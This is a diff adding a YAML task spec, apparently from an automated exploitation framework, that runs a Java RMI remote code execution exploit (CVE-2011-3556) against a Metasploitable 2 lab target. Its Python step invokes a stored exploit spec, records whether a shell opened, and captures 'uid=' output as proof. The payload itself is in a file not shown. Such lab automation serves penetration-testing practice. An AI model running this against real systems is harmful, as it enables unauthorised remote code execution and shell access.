@@ -1,0 +1,35 @@
+name: MS2 Java RMI Server Code Execution
+description: >
+  Java RMI registry allows remote class loading and code execution (CVE-2011-3556).
+  Delegates to the framework's verified exploit spec (exploits/ms2_java_rmi.yaml)
+  through run_spec, which drives the persistent target session.
+platforms:
+- linux
+scenario: metasploitable
+vector: ms2_java_rmi
+mitre: T1190
+trigger:
+- java-rmi
+- rmiregistry
+steps:
+- kind: lazymode
+  lang: python
+  timeout: 240
+  run: |
+    import re
+
+    from modules.atomic_exploit_bridge import load_all, run_spec
+
+    result = {"target": target, "vector": "ms2_java_rmi"}
+    spec = load_all().get("ms2_java_rmi")
+    if spec is None:
+        result["session_opened"] = False
+        result["error"] = "exploit spec ms2_java_rmi not found in exploits/"
+    else:
+        outcome = run_spec(spec, rhost=target)
+        blob = outcome.get("output") or ""
+        match = re.search(r"uid=\d+\([^)]*\)[^\n]*", blob)
+        result["cve"] = spec.cve
+        result["session_opened"] = bool(outcome.get("shell"))
+        result["success"] = bool(outcome.get("success"))
+        result["proof"] = (match.group(0).strip() if match else blob[-300:].strip()) or "(no proof)"
